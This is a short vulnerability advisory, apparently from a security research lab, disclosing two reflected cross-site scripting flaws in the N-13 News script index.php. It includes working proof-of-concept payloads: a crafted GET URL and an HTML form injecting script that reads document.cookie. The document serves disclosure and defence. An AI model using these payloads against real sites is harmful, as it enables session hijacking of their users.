Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in N-13 News, which can be exploited to perform cross-site scripting attacks.

1) Input passed via the GET "id" parameter to index.php is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:

http://[host]/index.php?id=%3C/script%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

2) Input passed via the POST "parent" parameter to index.php (when POST "rating" parameter is set to "true") is not properly sanitised before being returned to the user. 
This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.

The following PoC code is available:


<form action="http://[host]/index.php" method="post">
<input type="hidden" name="rating" value="true">
<input type="hidden" name="parent" value="<script>alert(document.cookie);</script>">
<input value="OK" type="submit">
</form>
